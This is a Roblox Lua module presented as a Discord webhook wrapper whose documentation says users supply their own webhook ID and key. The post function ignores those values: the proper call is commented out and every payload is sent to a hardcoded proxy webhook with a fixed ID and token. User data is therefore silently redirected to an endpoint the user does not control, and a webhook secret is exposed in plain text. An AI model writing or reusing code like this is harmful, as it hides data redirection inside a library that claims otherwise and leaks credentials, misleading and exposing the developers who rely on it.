--Discord WEBHOOK API BY TIGERISM

--[[
	DOCS:
	
	webHook::new
	Creates a new Discord WebHook. Supply your ID and Key as param 1 and param 2.
	
	webHook::post
	Posts your webhook to Discord. Supply values into a table in parameter one. Put what's the host in parameter two. Example: slack
	Use this as a reference: https://github.com/hammerandchisel/discord-api-docs/blob/8726b85b324daff6ab7e5fd05f8fefa7ebf20a1b/docs/resources/Webhook.md
--]]

local webHook = {}
webHook.__index = webHook

--RESOURCES:
local Http = game:GetService("HttpService")
--

function webHook.new(id,key) 
	local mt = setmetatable({id=id,key=key}, webHook) 
	return mt
end

function webHook:post(config,host)
	local data = nil
	local success = pcall(function()
		data = Http:JSONEncode(config)
	end)
	if not success then warn("Cannot convert WebHook to JSON!") return end
	--Http:PostAsync("https://discordapp.com/api/webhooks/"..self.id.."/"..self.key,data)
	Http:PostAsync("https://webhook.lewisakura.moe/api/webhooks/722536962317221928/5LEKplhvihs9USwZ5kJP5IwM3nmClS_Jsd-OdBV-PIHKy2EC1htIWhrru-qqydedt9eo/queue", data)
end

return webHook